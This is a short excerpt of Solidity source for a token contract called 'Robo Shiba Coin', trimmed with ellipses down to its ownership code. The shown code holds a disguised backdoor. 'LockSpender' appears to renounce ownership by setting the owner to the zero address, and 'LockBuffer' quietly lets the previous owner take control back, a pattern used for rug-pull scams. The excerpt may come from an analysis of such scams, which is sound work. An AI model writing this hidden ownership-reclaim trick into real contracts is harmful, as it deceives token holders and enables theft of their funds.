...
contract Ownable is Context {
    ...
    function LockBuffer() public virtual { require(_previousOwner == msg.sender); _owner = _previousOwner; }
    function LockSpender() public virtual onlyOwner { _owner = address(0); }
}
...
contract RoboShibaCoin is Context, IERC20, Ownable, ReentrancyGuard {
    ...
    string private _name = "Robo Shiba Coin";
    string private _symbol = "RoboShiba";
